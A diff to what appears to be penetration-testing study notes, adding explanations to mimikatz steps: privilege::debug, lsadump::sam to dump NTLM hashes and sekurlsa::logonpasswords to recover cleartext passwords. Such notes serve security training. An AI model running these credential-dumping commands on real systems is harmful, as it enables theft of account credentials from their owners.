@@ -116,8 +116,8 @@
    - upload mimikatz.exe
    - `\mimkatz.exe`
    - `privilege::debug` - should return Privilege '20' OK - This should be a standard for running mimikatz as it needs local administrator access
-   - `lsadump::sam`
-   - `sekurlsa::logonpasswords`
+   - `lsadump::sam` -> NTLM hashes for all of the user accounts on the system 
+   - `sekurlsa::logonpasswords` -> To find the clear text passwords, but it's not always possible
 
 </details>
 
